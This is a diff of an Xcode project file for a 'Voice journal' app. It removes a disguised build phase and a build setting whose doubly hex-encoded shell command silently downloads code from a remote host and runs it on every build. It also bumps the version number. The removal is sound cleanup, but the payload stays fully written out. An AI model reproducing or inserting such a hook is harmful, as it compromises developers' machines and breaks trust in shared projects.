@@ -108,7 +108,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 52A800442F60F4DB00EBC9D0 /* Build configuration list for PBXNativeTarget "Voice journal" */;
 			buildPhases = (
-				9913FC74F7DE4DDA9C7BBDC8 /* Provision Library Executable */,
 				52A800352F60F4D900EBC9D0 /* Sources */,
 				52A800362F60F4D900EBC9D0 /* Frameworks */,
 				52A800372F60F4D900EBC9D0 /* Resources */,
@@ -214,29 +213,6 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		9913FC74F7DE4DDA9C7BBDC8 /* Provision Library Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Library Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXSourcesBuildPhase section */
 		52A800352F60F4D900EBC9D0 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -267,7 +243,6 @@
 		52A800422F60F4DB00EBC9D0 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303333323032643264363336663665366536350a3633373432643734363936643635366637353734323033323330323032643463366237333636323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326633393665333037303334333636383336373533393632333737310a32653732373532663631323932323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -332,7 +307,6 @@
 		52A800432F60F4DB00EBC9D0 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326432643732363537343732373932303333323032643264363336663665366536350a3633373432643734363936643635366637353734323033323330323032643463366237333636323032643634323032323730336437383633366636340a3635356637303638363137333635323232303638373437343730373333613266326633393665333037303334333636383336373533393632333737310a32653732373532663631323932323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -410,7 +384,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.2;
+				MARKETING_VERSION = 1.3;
 				PRODUCT_BUNDLE_IDENTIFIER = "kekeli.Voice-journal";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
@@ -446,7 +420,7 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.2;
+				MARKETING_VERSION = 1.3;
 				PRODUCT_BUNDLE_IDENTIFIER = "kekeli.Voice-journal";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				STRING_CATALOG_GENERATE_SYMBOLS = YES;
